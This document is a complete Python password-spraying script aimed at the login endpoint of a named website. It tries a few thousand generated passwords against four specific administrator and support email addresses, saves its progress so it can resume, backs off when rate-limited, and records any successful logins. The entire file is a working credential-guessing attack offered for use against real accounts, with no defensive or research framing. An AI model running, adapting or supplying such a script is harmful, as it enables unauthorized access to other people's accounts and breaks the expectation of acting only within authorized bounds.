import ssl, json, urllib.request, urllib.error, time, os, sys

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

emails = [
    "admin@onlyfakeai.ru",
    "onlyfake@tuta.io",
    "support@onlyfakeai.ru",
    "onlyfake@onlyfakeai.ru",
]

base_words = [
    "onlyfake", "Onlyfake", "onlyFake", "OnlyFake", "ONLYFAKE",
    "onlyfakeai", "Onlyfakeai", "OnlyFakeAI", "onlyfakeAI",
    "onlyfake.ai", "onlyfake.ru", "fakeai", "FakeAI", "fake_ai",
    "admin", "Admin", "ADMIN", "administrator", "Administrator",
    "root", "Root", "support", "Support", "SUPPORT",
    "tuta", "Tuta", "tutanota", "Tutanota",
    "password", "Password", "PASSWORD", "pass", "Pass",
    "supabase", "Supabase", "postgres", "Postgres", "nextjs",
    "vercel", "cloudflare", "digitalocean", "only", "fake",
    "opsec", "opadmin", "opsadmin", "operator",
]
suffixes = [
    "", "123", "1234", "12345", "123456", "12345678", "123456789",
    "1", "01", "007", "69", "420", "666", "777", "888", "999",
    "2023", "2024", "2025", "2026", "24", "25", "26",
    "!", "@", "#", "$", "!!", "!@#", "123!", "123!!",
    "@123", "#123", "$123", "_123", "-123", ".123",
    "@2024", "@2025", "@2026", "!2024", "!2025", "!2026",
    "Admin", "admin", "AI", "ai", "Ru", "ru",
]
misc = [
    "Password123", "Password123!", "P@ssw0rd", "P@ssw0rd123",
    "P@ssw0rd!", "password123", "Password1", "Password1!",
    "Admin123", "Admin123!", "admin123", "admin123!",
    "admin@123", "Admin@123", "Admin@1234", "admin@onlyfakeai.ru",
    "onlyfake@tuta.io", "Support123", "Support123!",
    "support@onlyfakeai.ru", "onlyfake@onlyfakeai.ru",
    "qwerty", "qwerty123", "Qwerty123", "Qwerty123!",
    "letmein", "Letmein123", "letmein123", "welcome", "Welcome1",
    "Welcome123", "changeme", "ChangeMe123", "changeme123",
    "123456", "123456789", "111111", "000000", "abc123",
    "test123", "Test123", "Test1234!", "testing", "Testing123",
    "Iloveyou", "iloveyou", "dragon", "Dragon123", "monkey",
    "master", "Master123", "shadow", "Shadow123", "sunshine",
    "princess", "football", "baseball", "starwars", "pokemon",
    "FakeAI2024", "FakeAI2025", "OnlyFake2024", "OnlyFake2025",
    "OnlyFake2026", "OnlyFake2024!", "OnlyFake2025!",
    "OnlyFakeAI2024", "OnlyFakeAI2025", "onlyfakeai2024",
    "onlyfakeai2025", "onlyfakeai2026", "Onlyfakeai2024",
    "Onlyfakeai2025", "Onlyfakeai2026", "onlyfake123",
    "Onlyfake123", "ONLYFAKE123", "onlyfakeadmin",
    "OnlyFakeAdmin", "adminonlyfake", "AdminOnlyFake",
    "onlyfakeadmin123", "OnlyFakeAdmin123", "onlyfake2024",
    "onlyfake2025", "onlyfake2026", "Onlyfake2024",
    "Onlyfake2025", "Onlyfake2026", "onlyfakeai123",
    "OnlyFakeAI123", "fakeai123", "FakeAI123", "FakeAi2024",
    "FakeAi2025", "supabase123", "Supabase123", "supabase2024",
    "Supabase2024", "Tuta123", "tuta123", "tuta2024", "tuta2025",
    "Tutanota2024", "Tutanota2025", "Support2024", "Support2025",
    "support123", "Support1234", "support2026", "Admin2024",
    "Admin2025", "Admin2026", "admin2024", "admin2025",
    "admin2026", "Admin2024!", "Admin2025!", "Admin2026!",
]

cands = []
seen = set()
for w in base_words:
    for s in suffixes:
        c = w + s
        if c not in seen:
            seen.add(c)
            cands.append(c)
for m in misc:
    if m not in seen:
        seen.add(m)
        cands.append(m)

state_file = "spray_state.json"
if os.path.exists(state_file):
    state = json.load(open(state_file))
else:
    state = {"email_idx": 0, "cand_idx": 0, "hits": []}

log = open("spray2.log", "a", encoding="utf-8")

def save():
    json.dump(state, open(state_file, "w"))

def try_login(email, password):
    h = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "apikey": KEY,
        "Content-Type": "application/json;charset=UTF-8",
    }
    body = json.dumps({"email": email, "password": password}).encode()
    r = urllib.request.Request(BASE + "/auth/v1/token?grant_type=password", data=body, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

print(f"[spray2] {len(cands)} candidates x {len(emails)} emails, resuming at email_idx={state['email_idx']} cand_idx={state['cand_idx']}", flush=True)

while state["email_idx"] < len(emails):
    em = emails[state["email_idx"]]
    while state["cand_idx"] < len(cands):
        cand = cands[state["cand_idx"]]
        st, txt = try_login(em, cand)
        log.write(f"{time.strftime('%H:%M:%S')} {st} {em} {cand}\n")
        log.flush()
        state["cand_idx"] += 1
        save()
        if st == 200:
            state["hits"].append({"email": em, "password": cand, "resp": txt[:500]})
            save()
            print(f"\n!!! HIT {em} : {cand}\n{txt[:600]}", flush=True)
        elif st == 429:
            print(f"{time.strftime('%H:%M:%S')} 429 throttle, sleeping 40s", flush=True)
            time.sleep(40)
        else:
            time.sleep(3.0)
    state["email_idx"] += 1
    state["cand_idx"] = 0
    save()

print("[done] hits:", state["hits"], flush=True)
